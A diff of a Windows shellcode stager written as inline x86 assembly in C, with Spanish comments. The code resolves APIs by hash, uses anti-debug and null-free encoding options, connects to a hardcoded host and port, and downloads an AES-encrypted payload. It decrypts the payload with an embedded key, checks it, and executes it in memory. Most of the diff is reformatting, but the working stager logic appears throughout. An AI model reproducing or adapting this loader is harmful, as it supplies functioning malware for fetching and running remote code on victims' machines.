@@ -6,6 +6,10 @@
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
 
+//No queremos que muestre el warning de etiqueta sin referencia, 
+//ya que las usamos para mejorar la legibilidad del código
+#pragma warning(disable:4102)
+
 #include <Windows.h>
 #include "macros.h"
 
@@ -13,7 +17,7 @@ void LoadFunctions(DWORD numHashes);
 
 void __declspec(naked) main(){
     __asm{
-    #ifdef SC_DELTA
+#ifdef SC_DELTA
         /*###############################################################################
         ** Obtención del Delta offset:
         **    Obtenemos la posición relativa de nuestro código.
@@ -40,25 +44,31 @@ find_delta:
         #ifdef SC_NULL
         add  edi, K
         sub  edi, (find_delta+K)
-        #else
+        #else //SC_NULL
         sub  edi, find_delta
-        #endif
-        #ifdef ANTI_DEBUG
+        #endif //SC_NULL
+#else //SC_DELTA
+#ifndef SC_NULL
+#ifdef ANTI_DEBUG
         fld tbyte ptr[magic]
         jmp over
-  magic:EMIT_BYTE_ARRAY((0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) ('=') ('@'))
-   over:
-        #endif
-    #endif
+    magic:EMIT_BYTE_ARRAY((0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) ('=') ('@'))
+    over:
+#endif //ANTI_DEBUG
+#endif //!SC_NULL
+#endif //SC_DELTA
+
         //Pasamos inicio real del código saltando sobre las constantes.
         jmp  start
     }
+#pragma region constantes
         /*###############################################################################
         ** Constantes:
         **    Aquí se declaran las constantes utilizadas en el código{
         **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
-        **        KEY       : Utilizado para identificar al cliente en el 'handshake'
-        **        HOST      : Dónde se conectará el socket
+        **        VARS      : Variables utilizadas.
+        **        KEY       : Utilizado para identificar al cliente en el 'handshake'.
+        **        HOST      : Dónde se conectará el socket.
         **    }
         *###############################################################################*/
 #pragma region hashes
@@ -107,14 +117,14 @@ KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
                 /*bVersion*/    EMIT_BYTE(CUR_BLOB_VERSION)
-			    /*wReserved*/	EMIT_WORD(0)
+                /*wReserved*/   EMIT_WORD(0)
                 /*aiKeyAlg*/    EMIT_DWORD(CALG_AES_128)
             //}
             /*keySize*/         EMIT_DWORD(0x10)
             /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04) )	
         //}
 HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-
+#pragma endregion
     __asm{
 #ifdef ERR_CHECK
 /*###############################################################################
@@ -129,7 +139,7 @@ gtfo:
         call [ebp+_ExitProcess]
 conti:
         ret
-#endif
+#endif //ERR_CHECK
 CreateBuff:
         cdq                             //EDX = 0
         push PAGE_EXECUTE_READWRITE     //v
@@ -137,10 +147,10 @@ CreateBuff:
         push eax                        //v
         push edx                        //v
         call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-        #ifdef ERR_CHECK
+#ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
-        #endif
+#endif //ERR_CHECK
         ret
 start:
         /*###############################################################################
@@ -249,7 +259,6 @@ find_kernel32_finished:
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
 
-        #ifdef MUTEX
         push [ebp+_pHOST]               //v
         cdq                             //EDX = 0
         push edx                        //v
@@ -258,25 +267,24 @@ find_kernel32_finished:
         cdq                             //EDX = 0
         mov  edx, DWORD PTR FS:[edx+0x18]//v
         mov  eax, [edx+0x34]            //> GetLastError()
-        #ifdef ERR_CHECK
+#ifdef ERR_CHECK
         xor  al, 0xB7
         push ERR_MTX
         call gtfo
-        #else
+#else //ERR_CHECK
         test eax, eax
         jz  nomtx
         call [ebp+_ExitProcess]
 nomtx:
-        #endif
-        #endif
+#endif //ERR_CHECK
 
-        push 512                        //v
-        pop  eax                        //>EAX = 512
+        push 79                         //v
+        pop  eax                        //>EAX = 79
         call CreateBuff                 //Creamos Buffer para la ruta
         mov  edi, eax                   //EDI = EAX
 
         push eax                        //v
-        push 512                        //v
+        push 79                         //v
         call [ebp+_GetTempPathA]        //>GetTempPathA(512, Buff);
 
         cdq                             //EDX = 0
@@ -304,12 +312,12 @@ _cont:  mov  eax, BUFF_SIZE             //EAX = BUFF_SIZE
         shl  ebx, 0x4                   //EBX = 0x190
         sub  esp, ebx                   //Reservamos espacio suficiente en la pila para WSADATA
         push esp                        //v
-        #ifdef SC_NULL
+#ifdef SC_NULL
         push 2                          //v
         add  [esp+1], 2                 //v VersionRequested = 2.2
-        #else
+#else //SC_NULL
         push 0x202                      //v VersionRequested = 2.2
-        #endif
+#endif //SC_NULL
         call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
         add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta
 
@@ -331,15 +339,15 @@ newSocket:
         push [ebp+_pHOST]               //v
         call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
 
-        #ifdef ERR_CHECK
+#ifdef ERR_CHECK
         push ERR_HST                    //v
         call gtfo                       //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)
-        #endif
+#endif //ERR_CHECK
         add  eax, 0x20                  //EAX = hostent.h_name
         push eax                        //v
         call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);
 
-        #define PORT 0xD0070002
+#define PORT 0xD0070002
 
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
@@ -359,12 +367,12 @@ doConnect:
         jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
         loop doConnect                  //(ECX>0)? (Intentamos conectar de nuevo... hasta 121 veces)
         //No ha habido suerte conectando... esperemos 0x1E40ms y volvamos a intentar
-        #ifdef SC_NULL
+#ifdef SC_NULL
         push 0x79                       //v
         shl  DWORD PTR[esp], 0x6        //v
-        #else
+#else //SC_NULL
         push 0x1E40                     //v
-        #endif
+#endif //SC_NULL
         call [ebp+_Sleep]               //Sleep(0x1E40);
         jmp  rst
 connected:
@@ -410,57 +418,57 @@ KillSocket:
 init_decrypt:
         //Adquirimos el handle para trabajar con el CSP deseado.
         cdq                             //EDX = 0
-        #ifdef SC_NULL
+#ifdef SC_NULL
         push 0x0F
         shl  DWORD PTR[esp], 0x1C
-        #else
+#else //SC_NULL
         push CRYPT_VERIFYCONTEXT        //v
-        #endif
+#endif //SC_NULL
         push PROV_RSA_AES               //v
         push edx                        //v
         push edx                        //v
         push ebp                        //v
         add  [esp], _hProv              //v
         call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
-		//Importamos la clave
+        //Importamos la clave
         cdq                             //EDX = 0
-		push ebp                        //v
-		add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
-		push edx                        //v
-		push edx                        //v
-		push 0x1C                       //v sizeof(aes128Blob)
-		push [ebp+_pKEY]                //v Estructura que contiene la clave exportada
-		push [ebp+_hProv]				//v
-		call [ebp+_CryptImportKey]		//>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);
+        push ebp                        //v
+        add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
+        push edx                        //v
+        push edx                        //v
+        push 0x1C                       //v sizeof(aes128Blob)
+        push [ebp+_pKEY]                //v Estructura que contiene la clave exportada
+        push [ebp+_hProv]               //v
+        call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);
 
-		//Seteamos el valor del IV(Inicializacion Vector)
+        //Seteamos el valor del IV(Inicializacion Vector)
         cdq                             //EDX = 0
-		push edx                        //v
-		push [ebp+_pBuff]               //v
-		push KP_IV                      //v
-		push [ebp+_hKey]                //v
-		call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);
+        push edx                        //v
+        push [ebp+_pBuff]               //v
+        push KP_IV                      //v
+        push [ebp+_hKey]                //v
+        call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);
 
-		//Restamos el IV a los datos
-		add  [ebp+_pBuff], 16           //pBuff+= 16
-		sub  [ebp+_buffLen], 16         //buffLen-= 16
+        //Restamos el IV a los datos
+        add  [ebp+_pBuff], 16           //pBuff+= 16
+        sub  [ebp+_buffLen], 16         //buffLen-= 16
 
-		//Finalmente desciframos los datos obtenidos
-		//Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
+        //Finalmente desciframos los datos obtenidos
+        //Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
 
         cdq                             //EDX = 0
 
-		push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
+        push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
 
-		push esp                        //v
-		push [ebp+_pBuff]               //v
-		push edx                        //v
-		push edx                        //v
-		push edx                        //v
-		push [ebp+_hKey]                //v
-		call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
+        push esp                        //v
+        push [ebp+_pBuff]               //v
+        push edx                        //v
+        push edx                        //v
+        push edx                        //v
+        push [ebp+_hKey]                //v
+        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
 
-		pop  ecx                        //Borramos la variable temporal
+        pop  ecx                        //Borramos la variable temporal
 
         /*###############################################################################
         ** Comprobación del checksum:
@@ -488,12 +496,12 @@ FNV1a:
 NoErr4: push [ebp+_pKEY]                //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
-        #ifdef SC_NULL
+#ifdef SC_NULL
         mov  eax, ebp
         push [eax]                      //v
-        #else
+#else //SC_NULL
         push [ebp+_LoadLibraryA]        //v
-        #endif
+#endif //SC_NULL
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x8                   // Saltamos hasta el cargador_IAT
         call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);*/
@@ -533,17 +541,17 @@ find_function:
         add  edi, edx                   //EDI = EAT (RVA)
         mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
         mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
-        #ifdef SC_NULL
+#ifdef SC_NULL
         inc  edx                        //EDX++;
-        #endif
+#endif //SC_NULL
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
 find_function_loop:
-        #ifdef SC_NULL
+#ifdef SC_NULL
         mov  esi, [ebp+ecx*4-5]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
         dec  esi
-        #else
+#else //SC_NULL
         mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
-        #endif
+#endif //SC_NULL
         add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
 compute_hash:
         xor  ebx, ebx                   //EBX = 0
@@ -562,19 +570,19 @@ compute_hash_finished:
         loopne find_function_loop       //>(BX == FunctionHash)&(ECX>0)?
         mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
-        #ifdef SC_NULL
+#ifdef SC_NULL
         mov  cx, [ebp+ecx*2-1]
-        #else
+#else //SC_NULL
         mov  cx, [ebp+ecx*2]
-        #endif
+#endif //SC_NULL
         mov  ebp, [edi+0x1C]
         add  ebp, edx
-        #ifdef SC_NULL
+#ifdef SC_NULL
         mov  eax, [ebp+4*ecx-1]
         dec  eax
-        #else
+#else //SC_NULL
         mov  eax, [ebp+4*ecx]
-        #endif
+#endif //SC_NULL
 
         add  eax, edx
 find_function_finished:
